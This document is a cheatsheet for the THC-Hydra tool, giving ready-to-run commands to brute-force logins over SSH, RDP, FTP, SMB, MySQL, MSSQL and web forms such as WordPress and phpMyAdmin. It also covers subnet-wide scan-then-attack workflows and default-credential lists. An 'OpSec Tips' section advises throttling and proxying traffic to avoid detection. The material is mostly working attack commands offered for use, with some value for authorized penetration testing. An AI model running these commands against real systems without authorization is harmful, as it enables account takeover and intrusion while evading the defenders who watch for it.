# THC-Hydra Cheatsheet

## Quick Reference

### SSH Brute Force

```bash
# Single user, password list
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# User list, password list
hydra -L usernames.txt -P passwords.txt ssh://192.168.1.100

# Custom port
hydra -l admin -P passwords.txt ssh://192.168.1.100:2222

# With thread control
hydra -l root -P passwords.txt -t 4 ssh://192.168.1.100
```

### RDP Brute Force

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.100
```

### FTP Brute Force

```bash
hydra -l admin -P passwords.txt ftp://192.168.1.100
```

### HTTP POST Form

```bash
# Basic login form
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# WordPress
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:S=location"

# phpMyAdmin
hydra -l root -P passwords.txt 192.168.1.100 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1&target=index.php:F=access denied"
```

### MySQL Brute Force

```bash
hydra -l root -P passwords.txt mysql://192.168.1.100
```

### MSSQL Brute Force

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.100
```

### SMB Brute Force

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.100
```

### Password Generation

```bash
# Lowercase letters, length 3-6
hydra -l admin -x 3:6:a ssh://192.168.1.100

# Uppercase + numbers, length 4-8
hydra -l admin -x 4:8:A1 ssh://192.168.1.100
```

### Multiple Targets

```bash
# From file
hydra -l admin -P passwords.txt -M targets.txt ssh

# CIDR notation
hydra -l root -P passwords.txt ssh://192.168.1.0/24
```

### Default Credentials

```bash
# Generate default password list
dpl4hydra linksys > dpl4hydra_linksys.lst

# Use default credentials
hydra -C dpl4hydra_linksys.lst -t 1 192.168.1.1 http-get /index.asp
```

### Session Management

```bash
# Restore interrupted session
hydra -R
```

### Output Formats

```bash
# JSON output
hydra -l admin -P passwords.txt -o results.json -b json ssh://192.168.1.100

# Text output
hydra -l admin -P passwords.txt -o results.txt -b text ssh://192.168.1.100
```

## Command Options

| Option | Description |
|--------|-------------|
| `-l LOGIN` | Single username |
| `-L FILE` | Username list |
| `-p PASS` | Single password |
| `-P FILE` | Password list |
| `-C FILE` | Colon-separated `login:pass` file |
| `-e nsr` | Try null (n), login as pass (s), reversed (r) |
| `-x MIN:MAX:CHARSET` | Brute force generation |
| `-M FILE` | Target list file |
| `-s PORT` | Custom port |
| `-S` | Use SSL |
| `-f / -F` | Exit on first found (-f per host, -F global) |
| `-t TASKS` | Parallel tasks per target (default: 16) |
| `-T TASKS` | Parallel tasks overall (default: 64) |
| `-w TIME` | Wait time for response (default: 32s) |
| `-W TIME` | Wait time between connects |
| `-o FILE` | Output file |
| `-b FORMAT` | Output format: text, json, jsonv1 |
| `-v / -V` | Verbose / show login+pass |
| `-d` | Debug mode |
| `-R` | Restore session |
| `-4 / -6` | IPv4 / IPv6 |

## Supported Protocols

| Protocol | Module | Default Port |
|----------|--------|--------------|
| SSH | ssh | 22 |
| RDP | rdp | 3389 |
| FTP | ftp | 21 |
| Telnet | telnet | 23 |
| MySQL | mysql | 3306 |
| MSSQL | mssql | 1433 |
| PostgreSQL | postgres | 5432 |
| SMB | smb | 445 |
| HTTP GET | http-get | 80 |
| HTTP POST | http-post-form | 80 |
| HTTPS GET | https-get | 443 |
| SMTP | smtp | 25 |
| POP3 | pop3 | 110 |
| IMAP | imap | 143 |
| LDAP | ldap | 389 |
| VNC | vnc | 5900 |
| SNMP | snmp | 161 |
| Oracle | oracle | 1521 |

## Common Workflows

### Discover and Attack

```bash
# 1. Find services
nmap -p 22,80,445,3306,3389 --open 192.168.1.0/24 -oG - > services.txt

# 2. Extract targets per service
grep "22/open" services.txt | awk '{print $2}' > ssh_hosts.txt
grep "3389/open" services.txt | awk '{print $2}' > rdp_hosts.txt

# 3. Brute force
hydra -L usernames.txt -P passwords.txt -M ssh_hosts.txt ssh
hydra -L usernames.txt -P passwords.txt -M rdp_hosts.txt rdp
```

### HTTP Form Attacks

```bash
# Test form parameters
hydra -U http-post-form

# Attack with specific parameters
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"

# With cookies
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid:H=Cookie\: session=abc123"
```

### Multi-Host Attack

```bash
# Attack entire subnet
hydra -l root -P passwords.txt ssh://192.168.1.0/24

# Attack from target file
hydra -L usernames.txt -P passwords.txt -M targets.txt -t 8 ssh
```

## Troubleshooting

### Common Errors

**"too many open files"**:
```bash
ulimit -n 65535
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100
```

**False positives**:
```bash
hydra -l admin -P passwords.txt -f -v ssh://192.168.1.100
```

**Slow performance**:
```bash
hydra -l admin -P passwords.txt -t 32 -w 10 ssh://192.168.1.100
```

**SSL errors**:
```bash
hydra -l admin -P passwords.txt -O ftps://192.168.1.100
```

## OpSec Tips

1. **Reduce threads**: Use `-t 4` to avoid detection
2. **Increase wait**: Use `-w 60` to slow down
3. **Use proxy**: `export HYDRA_PROXY="socks5://proxy:1080"`
4. **Stop on first**: Use `-f` to verify findings
5. **Log everything**: Use `-o` for audit trail

## Resources

- **GitHub**: https://github.com/vanhauser-thc/thc-hydra
- **Kali Docs**: https://www.kali.org/tools/hydra/
- **Man Page**: `man hydra`
